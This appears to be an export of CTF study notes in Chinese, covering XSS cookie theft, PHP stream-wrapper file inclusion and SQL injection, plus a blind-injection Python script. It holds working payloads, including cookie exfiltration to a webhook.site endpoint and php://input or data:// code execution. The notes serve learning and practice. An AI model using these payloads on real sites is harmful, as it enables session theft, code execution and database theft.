(mozilla.org) window.location 对象 window.location 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如： scriptwindow.location=//webhook.site/xxxxxxxx/?cookie=+document.cookie;/script 下面是window.location 对象中可用于跳转的方法： window.location.href： window.location.href = //webhook.site/xxxxxxxx/?cookie=+document.cookie; window.location.assign(url)： window.location.assign(//webhook.site/xxxxxxxx/?cookie=+document.cookie); window.location.replace(url)： window.location.replace(//webhook.site/xxxxxxxx/?cookie=+document.cookie); window.open方法window.open() 是 JavaScript 中用于打开新窗口或新标签页的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象。 例如，以下代码将会在新窗口或新标签页中打开指定 URL： window.open(//webhook.site/xxxxxxxx/?cookie=+document.cookie); document.write方法利用 document.write 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口 scriptdocument.write(`img src=//webhook.site/xxxxxxxx/?cookie=$document.cookie `)/script scriptdocument.write(img src=//webhook.site/xxxxxxxx/?cookie=+document.cookie+/)/script 附：带src属性的标签 img： img src=image.jpg alt=示例图片 script： script src=script.js/script iframe： iframe src=page.html/iframe video 和 audio： video src=video.mp4 controls/video audio src=audio.mp3 controls/audio embed 和 object： embed src=file.pdf type=application/pdf object data=file.swf type=application/x-shockwave-flash/object 更多正在学习中…..jquery-ajax iCeServer Superagent socket axios jQuery AJAX 首先确保你的项目中已经包含了jQuery。如果没有，你可以通过添加以下标签来引入： html script src=https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js/script 发送请求的示例代码： javascript $.ajax( url: YOUR_ENDPOINT_HERE, method: GET, // 或者 POST, PUT, DELETE, 等。 success: function(data) console.log(data); , error: function(error) console.error(Request Failed:, error); ); Axios Axios不是原生支持的，需要引入。你可以通过CDN添加Axios： html script src=https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js/script 使用Axios发送请求： javascript axios.get(YOUR_ENDPOINT_HERE) .then(function (response) console.log(response.data); ) .catch(function (error) console.error(Request Failed:, error); ); Superagent Superagent也需要引入。通过CDN添加Superagent： html script src=https://cdnjs.cloudflare.com/ajax/libs/superagent/6.1.0/superagent.min.js/script 使用Superagent发送请求： javascript superagent .get(YOUR_ENDPOINT_HERE) .end((err, res) = if (err) return console.error(Request Failed:, err); console.log(res.body); ); WebSocket WebSocket是HTML5的一部分，不需要额外引入。但WebSocket用于实现双向通信，不同于常规的HTTP请求。以下是一个简单的WebSocket示例： javascript var socket = new WebSocket(wss://YOUR_WEBSOCKET_ENDPOINT_HERE);socket.onopen = function(event) socket.send(Hello Server!); // 发送数据到服务器;socket.onmessage = function(event) console.log(Message from server , event.data);; Fetch API Fetch API是现代浏览器原生支持的，不需要引入任何额外的库： javascript fetch(YOUR_ENDPOINT_HERE) .then(response = response.json()) // 假设服务器返回的是JSON数据 .then(data = console.log(data)) .catch(error = console.error(Request Failed:, error)); 请替换 YOUR_ENDPOINT_HERE 和 wss://YOUR_WEBSOCKET_ENDPOINT_HERE 为你实际的请求URL或WebSocket端点。每种方法都有其特定的使用场景和优势，选择合适的根据你的项目需求而定。","tags":["CTF-Web","Web-XSS"],"categories":["web"]},{"title":"常见协议与PHP伪协议","path":"/posts/b1f1aefc/","content":"常见协议与封装协议1 file:// — 访问本地文件系统2 http:// — 访问 HTTP(s) 网址3 ftp:// — 访问 FTP(s) URLs4 php:// — 访问各个输入/输出流(I/O streams)5 zlib:// — 压缩流6 data:// — 数据(RFC 2397)7 glob:// — 查找匹配的文件路径模式8 phar:// — PHP 归档9 ssh2:// — Secure Shell 210 rar:// — RAR11 ogg:// — 音频流12 expect:// — 处理交互式的流 file:访问本地文件系统，若不加协议名称，默认封装协议为file://协议 条件： allow_url_fopen:offon allow_url_include :offon 作用：用于访问本地文件系统（服务器中的文件），在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。 说明：当不说明使用file:协议的时（即默认file:协议的情况）可以使用相对路径，当使用了file协议时无法使用相对路径。 cmd=file://flag #用法错误，声明file协议时无法使用相对路径cmd=file:///flag #用法正确，使用绝对路径cmd=/flag #用法正确，使用绝对路径cmd=flag #用法正确，使用相对路径 相对路径 当指定了一个相对路径提供的路径将基于当前的目录。在很多情况下是脚本所在的目录。 Windows：不以:indows 盘符开头的路径 Linux:不以开头的路径 使用示例：以传参变量名为cmd演示 #Linuxcmd=file:///path/to/flag #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条cmd=/path/to/flag #根目录下path文件夹中to文件夹下flag文件cmd=relative/path/flag #当前目录下relative文件夹中path文件夹下flag文件cmd=flag #当前目录下的flag文件#Windowscmd=file://C:/path/to/flag #C盘中path文件夹中to文件夹下flag文件cmd=file://C:\\path\\to\\flag #C盘中path文件夹中to文件夹下flag文件cmd=C:\\path\\to\\flag #C盘中path文件夹中to文件夹下flag文件cmd=flag #当前文件夹下flag文件 http: 访问 HTTP(s) 网址 条件： allow_url_fopen:on allow_url_include:on 作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。 使用示例：以传参变量名为cmd演示 cmd=http://example.com/phpinfo.txt\t#读取http://example.com/phpinfo.txt文件cmd=https://example.com/file.php?var1=val1var2=val2\t#读取https://example.com/file.php文件并且传入var1和var2的值 php: 访问各个输入输出流(IO streams)，伪协议提供了多种不同的方式来访问和处理数据 常见的PHP伪协议： php://input #这个伪协议用于访问HTTP请求的原始主体数据。它通常用于从POST请求中读取数据。php://output #这个伪协议用于访问HTTP响应的输出流。它通常用于向客户端发送数据。php://stdin #用于访问标准输入流。php://stdout #用于访问标准输出流。php://stderr #用于访问标准错误输出流。php://temp #用于临时存储数据的内存流。它可以用于在没有创建实际文件的情况下处理临时数据。php://memory #用于在内存中创建可读写的数据流。php://filter #这个伪协议用于数据过滤和转换。它允许您将不同的过滤器应用于数据流，例如Base64编码、压缩和加密等。php://globals #用于访问全局变量。可以通过此伪协议查看和修改PHP全局变量的值。php://fd #用于访问文件描述符。它允许您在PHP中访问底层文件系统。 在CTF中经常使用的是php://filter和php://input、php://filter用于读取源码，php://input用于执行POST参数中的php代码。 作用：php: 访问各个输入输出流(IO streams) 条件： allow_url_fopen:offon allow_url_include :仅php://input 、php://stdin、php://memory、php://temp 需要on php:filter条件： allow_url_fopen:offon allow_url_include :offon 作用： php://filter可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理。（即读取或写入数据之前对其进行修改或过滤。） 名称 描述 resource要过滤的数据流 这个参数是必须的。它指定了你要筛选过滤的数据流。（加绝对路径） read读链的筛选列表 read参数指定 一个或多个过滤器 用于读操作，可以设定一个或多个过滤器名称，以管道符分隔。（读取文件后编码输出） write写链的筛选列表 write参数指定 一个或多个过滤器 用于写操作，可以设定一个或多个过滤器名称，以管道符分隔。（编码重写入文件） ；两个链的筛选列表 任何没有以 read 或 write 作前缀的筛选器列表会视情况应用于读或写链。 注： read 和 write 指令是互斥的，不能同时使用。 如果存在多个过滤器，字符串从左到右的顺序经过过滤器 write指令用于写入文件，对字符串编码后写入 ?php/* 将 Hello World 进行base64编码然后写入根目录flag.txt文件 */file_put_contents(php://filter/write=convert.base64-encode/resource=/flag.txt,Hello World);? 常用过滤语句： cmd=php://filter/read=convert.base64-encode/resource=/flag //读取根目录flag文件，进行base64编码 常用过滤器 PHP 版本中的过滤器也许比这里列出的更多（或更少），可用 stream_get_filters()来列出 PHP 中已安装的过滤器。 以docker的PHP8.3.4为例，自带的过滤器有 zlib.* convert.iconv.* string.rot13 string.toupper string.tolower convert.* dechunk consumed (目前也不知道是啥) 字符串过滤器 string.rot13（对字符串执行ROT13编码转换） string.toupper（将字符串转化为大写） string.tolower（将字符串转化为小写） string.strip_tags(自 PHP 7.3.0 起废弃，从字符串中去除 HTML 和 PHP 标记) 官方文档： PHP: 字符串过滤器 - Manual 转换过滤器注：转换过滤器是 PHP 5.0.0 添加的 convert.base64-encode和 convert.base64-decode（将字符串进行base64编码加解密） convert.quoted-printable-encode 和 convert.quoted-printable-decode（将字符串进行Quoted-printable编码加解密） Quoted-Printable 编码 - 知乎 (zhihu.com) convert.iconv.*（将字符串进行字符编码转化） 官方文档： PHP: 转换过滤器 - Manual 压缩过滤器 压缩过滤器可以在网络的流中提供通用压缩，将一个非压缩的流转换成一个压缩流。可以在任何时候应用于任何流资源。 官方文档： PHP: 压缩过滤器 - Manual 加密过滤器（已自 PHP 7.1.0 起废弃） 加密过滤器特别适用于文件数据流的加密。 官方文档： PHP: 加密过滤器 - Manual dechunk 将HTTP分块Chunk传输的数据进行解码 HTTP分块Chunk传输： 告别等待！HTTP分块Chunk传输让客户端响应更迅速数据即时呈现-腾讯云开发者社区-腾讯云 (tencent.com) 注：比较特别的是，进行解码的数据流每行都有后缀CRLF（即\\r ），否则将得到空字符串 php:input主要用来接收post数据。 条件： allow_url_fopen:offon allow_url_include :on 说明： CTF中文件包含题目里，可以使用php://input协议，将post请求中的数据作为php代码执行。 使用示例：以传参变量名为file演示 [URL部分]?file=php://input[POST DATA部分]?php phpinfo(); ? zlib: 压缩流 条件 allow_url_fopen:offon allow_url_include :offon 作用 ​\tzip:// bzip2:// zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg、png、gif等等。 注：zlib:// 需要是服务器内的压缩包文件、但不局限于后缀名 示例： 1、 zip:[压缩文件绝对路径]#[压缩文件内的子文件名] 注意：#需要URL编码为%23，传入时不要加上[ ] 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传目录varwwwhtml，以file为文件包含的参数为例： ?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt 2、compress.bzip2:file.bz2压缩 phpinfo.txt 为 phpinfo.bz2 并上传(同样支持任意后缀名)，并上传目录varwwwhtml，以file为文件包含的参数为例： ?file=compress.bzip2:///var/www/html/phpinfo.bz2 3、compress.zlib:file.gz压缩 phpinfo.txt 为 phpinfo.gz 并上传(同样支持任意后缀名)，并上传目录varwwwhtml，以file为文件包含的参数为例： ?file=compress.zlib:///var/www/html/phpinfo.gz phar:phar:协议与zip:类似，同样可以访问zip格式压缩包内容 例如,上传压缩包到目录varwwwhtml，以file为文件包含的参数为例： ?file=phar:///var/www/html/phpinfo.zip/phpinfo.txt data:条件 allow_url_fopen:on allow_url_include :on 作用自PHP5.2.0起，可以使用data:数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。 用法 data://text/plain,[加上所需传输的经过url编码数据] data://text/plain;base64,[加上所需传输的经过base64编码再经过url编码的数据] 注意：传入时不要加上[ ] 示例： data:textplain, http://127.0.0.1/include.php?file=data://text/plain,?php%20phpinfo();? data:textplain;base64, http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 使用场景当遇到文件包含可使用伪协议进行 可能遇到的文件包含函数： includerequireinclude_oncerequire_oncehighlight_fileshow_sourcefliereadfilefile_get_contents file_put_contentsfopen include和require函数​\t通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件(在服务器执行它之前)。 include 和 require 语句是相同的，除了错误处理方面： require 会生成致命错误(E_COMPILE_ERROR)并停止脚本、include 只生成警告(E_WARNING)，并且脚本会继续 语法： include filename;require filename; 区别： ?php include 23333.php;? 由于23333.php不存在使用include的时候，只会在当前语句报错，然后执行后边的正常语句 ?php require 23333.php;? 但是使用require的时候，就会直接报错然后跳出函数。 include_once和require_once函数​\tinclude_once (require_once)语句在脚本执行期间包含并运行指定文件。此行为和 include (require)语句类似，区别是如果该文件中的代码已经被包含了，则不会再次包含，只会包含一次。include_once(require_once)需要查询一遍已加载的文件列表, 确认是否存在, 然后再加载。 ?phprequire 1.php;require 1.php;? 这种情况下1.php被包含两次。 ?phprequire 1.php;require_once 1.php;? 这种情况下，第二次包含时，是不会进行包含的。 highlight_file()和show_source()两个函数的用法相同，因为show_source()是highlight_file()的别名 show_source(filename,return);highlight_file(filename,return); 其中return是可选项 参数 描述 filename 必需。要进行高亮处理的 PHP 文件的路径。 return 可选。如果设置 true，则本函数返回高亮处理的代码，而不是输出它们。 ​\t​ readfile和file_get_contents和file三者区别： 名称 作用 file 把整个文件读入一个数组中 readfile 读入一个文件并写入到输出缓冲。 file_get_contents 将整个文件读入一个字符串 注：以下提到的**PHP 的内置路径（include_path）**为在php.ini的php配置文件中进行设置的搜索路径。 file_get_contentsfile_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。 file_get_contents(path,include_path,context,start,max_length) 参数 描述 path 必需。规定要读取的文件。 include_path 可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果您还想在 include_path(在 php.ini 中)中搜索文件的话，请设置该参数为 ‘1’。 context 可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。 start 可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。 max_length 可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。 readfilereadfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。 readfile(filename,include_path,context) 参数 描述 filename 必需。规定要读取的文件。 include_path 可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果您还想在 include_path(在 php.ini 中)中搜索文件的话，请设置该参数为 ‘1’。 context 可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。 file与 file_get_contents() 类似，不同的是 file() 将文件读取后作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。 file(path,include_path,context) 参数 描述 path 必需。规定要读取的文件 include_path 可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1” context 可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。若使用 null，则忽略。 file_put_contentsfile_put_contents() 函数把一个字符串写入文件中。 int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) 参数 功能 filename 必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件 data 必需。规定要写入文件的数据。可以是字符串、数组或数据流 flag 可选。规定如何打开写入文件。可能的值： FILE_USE_INCLUDE_PATH ：只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）搜索文件。FILE_APPEND：如果设置了该标志，数据将被追加到文件末尾而不是覆盖文件内容。 LOCK_EX：如果设置了该标志，在写入文件时会获取一个独占锁定（排它锁），以防止其他进程同时写入文件。这可以确保在多个进程同时写入文件时不会发生冲突。 context 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。 该函数访问文件时，遵循以下顺序： 如果设置了 FILE_USE_INCLUDE_PATH 标志，函数将首先检查 filename 参数的副本是否存在于 PHP 的内置路径（include_path）中。 函数将打开文件以进行写入操作。 如果设置了 LOCK_EX 标志，函数将对文件进行锁定（获取独占锁定），以确保在写入文件时不会发生冲突。 如果设置了 FILE_APPEND 标志，函数将将写入的数据追加到文件末尾。否则，函数将清除文件的内容并写入新的数据。 函数将写入数据到文件中。 函数将关闭文件并释放对文件的所有锁定。 ​\t​ fopenfopen() 函数打开一个文件或 URL。 fopen(filename,mode,include_path,context) 参数 描述 filename 必需。规定要打开的文件或 URL。 mode 必需。规定您请求到该文件流的访问类型。可能的值：”r” （只读方式打开，将文件指针指向文件头）”r+” （读写方式打开，将文件指针指向文件头）”w” （写入方式打开，清除文件内容，如果文件不存在则尝试创建之）”w+” （读写方式打开，清除文件内容，如果文件不存在则尝试创建之）”a” （写入方式打开，将文件指针指向文件末尾进行写入，如果文件不存在则尝试创建之）”a+” （读写方式打开，通过将文件指针指向文件末尾进行写入来保存文件内容）”x” （创建一个新的文件并以写入方式打开，如果文件已存在则返回 FALSE 和一个错误）”x+” （创建一个新的文件并以读写方式打开，如果文件已存在则返回 FALSE 和一个错误） include_path 可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。 context 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。 实战No.1 土豆哥给的题目?phphighlight_file(__FILE__);error_reporting(0);print(easy lfi, but no flag~~);$cmd = $_POST[cmd];//flag in /flagif (isset($cmd)) print (first one: . br); $cmd = preg_replace(/flag/i, , $cmd); echo $cmd; if (preg_match(/flag/i, $cmd)) include($cmd); 土豆哥：flag一般在根目录下(根本没听到,做了很多无用功，但偶然接触到了一句话木马) 题解： ​\t$cmd = preg_replace(/flag/i, , $cmd);这个正则表达式用于删除cmd中含有flag地方，第二个 if (preg_match(/flag/i, $cmd))用来判断是否含有flag这个词如果有则进行if下的内容。 ​\t按题目的含义我们可以构造出flflagag这个作为flag的替代 ​\t尝试直接进行cmd=/flflagag进行传参，发现并没有出现参数，判读估计进行了隐藏。使用php中的php:filter伪协议进行读取，使用cmd=php://filter/read=convert.base64-encode/resource=/flag尝试使用base64加密后读取。 ​\t页面出现经过base64加密后的内容 PD9waHAKJEZMQUcgPSAiUk9JU3tkb3Vkb3VibGVibGVfY21jbWRkX3dpd2lubn0iOw== 解密 ?php$FLAG = ROISdoudoubleble_cmcmdd_wiwinn; 发现flag是个变量无法直接通过include包含直接读出。 No.2 CTFHub 技能树-RCE-文件包含-远程包含?phperror_reporting(0);if (isset($_GET[file])) if (!strpos($_GET[file], flag)) include $_GET[file]; else echo Hacker!!!; else highlight_file(__FILE__);?hri dont have shell, how to get flag?bra href=phpinfo.phpphpinfo/a 页面给了个小提示 phpinfo Directive Local Value Master Value allow_url_fopen On On allow_url_include On On 题解： 查看题目 ​ if (!strpos($_GET[file], flag))发现题目要求必须使用非含flag的文件进行包含，则此时可以考虑进行远程包含。在服务器上建立一个txt文件，里面写入能进行打印出根目录下flag的代码，如： ?php system(cat /flag); ? 使用http://协议，最后成功获取代码","tags":["CTF-Web","Web-PHP"],"categories":["web"]},{"title":"SQL注入","path":"/posts/e73517db/","content":"SQL注入流程 找到注入点：判断是否有漏洞，寻找插入位置 构造注入语句，并在注入点注入形成新的SQL语句 新形成的SQL语句提交数据库处理 数据库执行新的SQL语句，引发注入攻击 前置知识1.特别的数据库 在MySQL 5.0版本之后，MySQL默认在数据库中存放一个information_schema的数据库，在该库中，需要记住三个表名，分别是：schemata、tables、columns。 schemata表存储该用户创建的所有数据库的库名。 其中记录数据库库名的字段名为：schema_name。 tables表存储该用户创建的所有数据库的库名和表名。 其中记录数据库库名和表名的字段名分别是：tables_schema和table_name。 columns表存储该用户创建的所有数据库的库名、表名和字段名。 其中记录数据库库名、表名和字段名的字段名分别是：tables_schema、table_name和column_name。 2.注释符 在MySQL中，常见注释符的表达方式： ​ # …… ：#号后面的都会被注释 ​ -- …… ：--号后面的都会被注释，不过在 -- 的前后都需要加空格再加数据(GET传参时只能使用--，后的空格用+代替) ​ /* ... */ ：在查询语句中使用斜杠星号注释，从 开始到 * 结束的部分都被视为注释，不会被执行。 但**/* ... */** 的特殊用法--条件注释 条件注释是一种特殊的注释语法，它允许在注释中使用关键字，而这些关键字在执行查询时会被解析为相应的操作。 语法格式为： /*!conditional_keyword query_part */ 例如：index?id=-10 /*!union*/ /*!select*/ 1,2,3等同于index?id=-10 union select 1,2,3 SQL注入常用基础语句select version(); #查看数据库版本 select user(); #查看数据库用户select database(); #查看当前库名;select table_name from information_schema.tables where table_schema=database() ; #查看当前库下的表名select group_concat(table_name) from information_schema.tables where table_schema=database() ; #只回显一行数据下查看当前库下的全部表名select column_name from information_schema.columns where table_schema=database() and table_name=xxx; #查询列名-把xxx缓存前面查询到的表名 SQL注入常用函数联合查询(union)注入使用1.concat()函数 ​\tconcat()函数：将多个不同字段的字符串连接成一个字符串。 concat(str1，str2) #语法 注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。 2.group_concat()函数 ​\tgroup_concat() 将多个同个字段的字符串连接成一个字符串。 group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’]) #语法 报错注入使用1.extractvalue()函数 ​\t从 MySQL 5.7.8 版本开始，ExtractValue() 函数已被弃用 ​\tExtractValue() 函数来提取 XML 字符串中的特定路径的值。 ExtractValue(xml_string, xpath_expression) xml_frag：xml文档对象的名称，是一个string类型。 xpath_expr：使用xpath语法格式的路径。 2.updataxml()函数 xml_target：xml文档对象的名称，是一个string类型。 xpath_expr：使用xpath语法格式的路径。 new_xml：需要更新的内容。 3.count()+rand()+floor()+group by()函数 rand()函数：rand()返回0到1的随机数。rand(0)返回一个固定的0到1的伪随机数。 floor()函数：floor(x)返回小于或等于 x 的最大整数。 group by语句：group by语句可以根据一个或多个列对结果集进行分组，在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。 布尔盲注使用1.substr()/substring()函数 ​\tsubstr()/substring()函数：用来截取数据库某个字段中的一部分。 substr(string，start开始位置，length截取长度) #语法 参数 string：必选，数据库中需要截取的字段 start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始 截取；0，在字符串中第一个位置开始截取。 length：可选，需要截取的长度。缺省。即截取到结束位置 2.ascii()函数 ​\tascii()函数：返回字符串str的最左边的数值。 ascii(str) #语法 2.length() 函数，返回字符串的长度 length(str) #语法 注入点分类①数字型注入点类似的后端语句 $id=$_GET[id];$sql=SELECT * FROM users WHERE id=$id LIMIT 0,1;$result=mysql_query($sql);$row = mysql_fetch_array($result); 在 Web 端大概是 http://xxx.com/index.php?id=1 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。 用1 and 1=1进行组合出来的sql注入语句为： select * from news where id=1 and 1=1 ②字符型注入点类似的后端语句 $id=$_GET[id];$sql=SELECT * FROM users WHERE id=$id LIMIT 0,1;$result=mysql_query($sql);$row = mysql_fetch_array($result); 在 Web 端大概是 http://xxx.com/index.php?id=admin 这种形式，其注入点id 类型为字符类型，所以叫字符型注入点。 使用id=1 and 1=1 --+组合出来的sql注入语句为： select * from news where id=admin and 1=1 --+ LIMIT 0,1; 注意多了一个引号。由于注入拼接语句后多了一个,需要用注释符进行消除对语句的影响 ③搜索型注入点这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为： select * from 表名 where 字段 like %关键字%`。组合出来的sql注入语句为：select * from news where search like %测试 % and %1%=%1%测试% union select 1,2,3,4 and %= 判断注入点注意区别语句报错与页面报错、页面数据不正确的区别 ​\t1.?id=1 and 1=1 和?id=1 and 1=2进行测试如果11页面显示正常和原页面一样，并且12页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。 ​\t2.?id=1 and 1=1 --+ / #和?id=1 and 1=2 --+ / #或使用?id and 1=1和?id and 1=2进行测试如果11页面显示正常和原页面一样，并且12页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。 ​\t3.?id=1% and 1=1 --+ / #和?id=1% and 1=2 --+ / #进行测试如果11页面显示正常和原页面一样，并且12页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。 注入方法联合查询注入联合查询语句： select a from b union select c from d where e; 使用条件：页面对查询语句有回显查询数据 注意事项： 使用联合查询注入时,位于union前的语句不要出现查询的结果(后端只选择查询结果第一行的情况，若前一部分可以被查询，则联合查询的部分不会回显) 若前部分有结果，可在每次的union查询后添加语句limit n,1(n根据题目实际进行切换)起到回显联合查询结果的作用 注：limit num1，num2的作用为从第num1行开始显示num2行内容 所需函数1.concat()函数 ​\tconcat()函数：将多个不同字段的字符串连接成一个字符串。 concat(str1，str2) #语法 注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。 2.group_concat()函数 ​\tgroup_concat() 将多个同个字段的字符串连接成一个字符串。 group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’]) #语法 注入流程 判断类型 字段数 联合查询(union)，必选保证union前后两个查询的字段数一致，即两个查询结果有相同的列数，因此要对前一个的字段数进行判断。可以使用order by 数字进行判断 注：order by n表示查询结果通过第n个字段进行排序 使用示例： id=1 order by 1 --+ 使用时不断增大数字，假设直至第n个出现错误，从而判断出字段数为n-1 回显点 知道字段数之后，我们还需要确定在哪个字段是回显到页面上的 直接根据字段数，联合查询数字1，2，3...,以三个字段数为例 id=1 order by union select 1,2,3 --+ 从页面上查找回显的是哪个数字 爆库名、表名，字段名，数据 ​\t使用union语句在回显位置导出数据库中的数据，结合上文中的SQL注入常用基础语句 以2位置为回显点，爆表名为例 id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 布尔盲注构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息 使用条件：适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false类似的结果（例如：登录成功、） 注意事项： 前面参数在数据库无结果时，拼接语句使用关键词or 前面参数在数据库有结果时，拼接语句使用关键词and 另建议使用脚本 注入使用函数1.substr()/substring()函数 ​\tsubstr()/substring()函数：用来截取数据库某个字段中的一部分。 substr(string，start开始位置，length截取长度) #语法 参数 string：必选，数据库中需要截取的字段 start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始 截取；0，在字符串中第一个位置开始截取。 length：可选，需要截取的长度。缺省。即截取到结束位置 2.ascii()函数 ​\tascii()函数：返回字符串str的最左边的数值。 ascii(str) #语法 3.length() 函数 ​\tlength() 函数，返回字符串的长度 length(str) #语法 4.left() 函数 ​\tleft() 函数，返回从左至右截取固定长度的字符串 left(str,n) #语法 截取字符串str的从左至右前n个字符 注入流程 求当前数据库长度 求当前数据库表的ASCII (即爆出数据库名) 求当前数据库中表的个数 求当前数据库中其中一个表名的长度 求当前数据库中其中一个表名的ASCII 求列名的数量 求列名的长度 求列名的ASCII 求字段的数量 求字段内容的长度 求字段内容对应的ASCII 手工注入过程详解 基本模板 ?id=1 and (长度/字符函数(所爆数据的SQL) = n) --+ 例如： ?id=1 and ASCII(SUBSTR((select table_name FROM information_schema.tables where table_schema = database() LIMIT 0,1),1,1)) = 101 # 以爆数据库名字为例 求长度 ?id=1 and (length(database()) = n) --+ 通过页面的回显进行判断，数据库的长度是多少 求数据库名称 使用left 函数 -- 从左至右截取一个字符SELECT * from users WHERE id = 1 and (left(database(),1)=*)-- 从左只有截取两个字符SELECT * from users WHERE id = 1 and (left(database(),2)=**)-- 从左只有截取n个字符SELECT * from users WHERE id = 1 and (left(database(),n)=*****) 不断修改*中的字符，使之页面显示为true的类似项（如登录成功、成功等） 使用SUBSTR函数 -- 截取第1个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),1,1)) = ***)-- 截取第2个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),2,1)) = ***)-- 截取第n个字符SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),n,1)) = ***) 不断修改*中的ASCII码，使之页面显示为true的类似项（如登录成功、成功等） 注入脚本注意查看表单的提交变量名称 使用POST提交数据 import requestschars = R0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@%/^!~result = def get_length(value): # 获取要查询的数据的长度 for n in range(1, 100): payload = admin and length((0)) =1 #.format(data_payload, n) data = username: payload, password: admin //注意查看表单的提交变量名称 html = requests.post(url, data=data) length = len(html.text) if length value: print(……data length is : + str(n)) return ndef get_data(data_length, value): # 获取数据 global result for i in range(1, data_length): for char in chars: payload = adminand ascii(substr((0),1,1))=2 #.format(data_payload, i, ord(char)) data = username: payload, password: admin //注意查看表单的提交变量名称 html = requests.post(url, data=data) length = len(html.text) if length value: # 根据返回长度的不同来判断字符正确与否 result += char print(…… data is : + result) breakurl = http://***.***.10.67:2081/hard.phpdata_payload = select password from users limit 0,1 //所爆数据的sql语句value = 550 # 根据正确访问和错误访问时返回页面文本长度的不同 来设置一个判断值，这个值需要在浏览器中 按f12 查看length = get_length(value) +1get_data(length, value)print(result)","tags":["CTF-Web","Web-SQL"],"categories":["web"]},{"title":"PHP特性","path":"/posts/44659fec/","content":"PHPPHP中的比较符php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。 在php中有两种比较符号: 一种是 弱等于，另外一种是 强等于，都是用来比较两个数值是否相等的操作符，但他们也是有区别的: 弱等于 在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。 ==：等于比较符号。用于比较两个值是否相等，不考虑数据类型。 != 或 ：不等于比较符号。用于比较两个值是否不相等，不考虑数据类型。 ：小于比较符号。用于比较两个值的大小，如果左侧的值小于右侧的值，则条件为真。 ：大于比较符号。用于比较两个值的大小，如果左侧的值大于右侧的值，则条件为真。 =：小于等于比较符号。用于比较两个值的大小，如果左侧的值小于或等于右侧的值，则条件为真。 =：大于等于比较符号。用于比较两个值的大小，如果左侧的值大于或等于右侧的值，则条件为真。 强等于 在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。 ===：全等比较符号。用于比较两个值是否相等，并且数据类型也相同。 !==：不全等比较符号。用于比较两个值是否不相等，或者数据类型不相同。 弱等于转化规则规则1.若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字（最开头的部分），则其值就是开始的数字，否则（包括后面出现数字的情况），其值为0。例如: 